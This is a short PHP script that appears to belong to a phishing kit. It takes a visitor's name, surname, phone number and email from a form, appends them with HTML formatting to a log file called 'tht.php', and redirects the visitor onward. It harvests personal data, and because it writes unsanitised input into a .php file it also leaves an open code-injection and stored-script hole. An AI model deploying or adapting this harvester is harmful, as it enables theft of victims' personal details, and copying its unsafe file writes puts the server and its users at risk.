<?php
$cevap1 = $_POST['isim'];
$cevap2 =  $_POST['soyad'];
$cevap3 = $_POST['telefon'];
$cevap4 = $_POST['mail'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('tht.php', 'a'); 
fwrite($file, "<font color='gray'>İsim :</font><font color='red'> " .$cevap1. "</font><br>\n<font color='gray'> Soyad: </font><font color='green'>" .$cevap2. "</font><br>\n<font color='gray'>Telefon:</font><font color='white'> " .$cevap3. "</font><br>\n<font color='gray'>Mail :</font><font color='white'> " .$cevap4.  "</font><hr>");
fclose($file); 
echo '';
			header("Refresh:0; url=/son");
?>
